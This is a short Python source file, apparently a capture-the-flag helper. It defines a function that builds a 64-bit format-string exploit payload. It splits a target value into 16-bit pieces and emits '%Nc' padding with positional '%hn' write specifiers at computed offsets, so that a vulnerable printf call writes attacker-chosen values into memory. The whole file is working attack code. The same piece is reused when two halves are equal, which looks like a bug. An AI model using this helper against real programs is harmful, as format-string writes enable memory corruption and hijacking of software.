class fsb:

    def fsb64(off, data):
        payload_arr = []
        total_len = 0
        prev = 0
        for i in range(3):
            target = (data >> (i * 16)) & 0xffff
            if target < prev:
                payload = "%{}c".format(str((0x10000 - prev)  + target))
            elif target > prev:
                payload = "%{}c".format(str(target - prev))
            total_len += len(payload)
            payload_arr.append([len(payload), payload])
            prev = target   

        offset = off + int(total_len / 8)
        offset += int((int(total_len % 8) + 12) / 8) 
        least = int((int(total_len % 8) + 12) % 8)
    
        num = ''
        for i in range(3): 
            num += str(offset + i)
     
        offset += int((least + len(num)) / 8)    
        if int((least + len(num)) % 8):
            offset += 1

        payload = ''
        for i in range(3):
            payload += payload_arr[i][1]
            payload += "%{}$hn".format(offset + i)
    
        mapp = 8 - (len(payload) % 8)
        payload += "A" * mapp

        return bytes(payload, 'utf-8')
